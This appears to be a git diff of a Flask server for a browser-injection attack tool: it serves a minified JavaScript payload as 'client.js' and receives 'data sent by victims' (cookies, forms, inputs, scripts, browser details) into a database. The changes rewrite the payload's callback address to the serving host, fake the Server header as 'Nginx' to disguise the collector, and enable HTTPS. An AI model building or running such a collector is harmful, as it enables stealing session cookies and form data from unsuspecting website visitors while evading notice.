@@ -1,8 +1,9 @@
-from flask import Flask, request, send_file
+from flask import Flask, request, make_response, send_file
 from db import get_or_insert_extraction, build_content_to_link_relationships
 from db import create_connection, create_db, insert_content, insert_cookie, insert_link, insert_script, insert_form, insert_input, insert_browser
 from flask_cors import CORS
 from jsmin import jsmin
+from urllib.parse import urlparse
 
 import logging
 import os
@@ -28,10 +29,23 @@ with open('./payload.js') as js_file:
         outputfile.write(minified)
 
 # Serve payload, so that it can be included as a script reference.
+# Host name and the port data is sent to will be derived from the way this endpoint is accessed. 
 @app.route('/client.js', methods=['GET'])
 def clientjs():
     print("[+] Sending Payload")
-    return send_file('./payload.js', attachment_filename='client.js')
+    response = make_response(send_file('./payload.min.js', attachment_filename='client.js'))
+    response.direct_passthrough = False
+    response.headers["Server"] = "Nginx"
+
+    data = response.get_data()
+    url = urlparse(request.base_url)
+    if url.port != None and url.port != "":
+        data = data.decode("utf-8").replace("http://127.0.0.1:9444", url.scheme + "://" + url.hostname + ":" + str(url.port))
+    else:
+        data = data.decode("utf-8").replace("http://127.0.0.1:9444", url.scheme + "://" + url.hostname)
+    response.set_data(data)
+
+    return response 
 
 # Accept data sent by victims. 
 @app.route('/data', methods=['POST'])
@@ -112,13 +126,15 @@ def content():
 
     build_content_to_link_relationships(conn, extraction_id)
 
-    return ""
+    response = make_response("")
+    response.headers["Server"] = "Nginx"
+    return response
 
 # For HTTP
-app.run(host='0.0.0.0', port=9444)
+# app.run(host='0.0.0.0', port=9444)
 
 # For HTTPS
-# app.run(host='0.0.0.0', port=9445, ssl_context=('cert.pem', 'key.pem'))
+app.run(host='0.0.0.0', port=9444, ssl_context=('cert.pem', 'key.pem'))
 
 
 # Installation steps
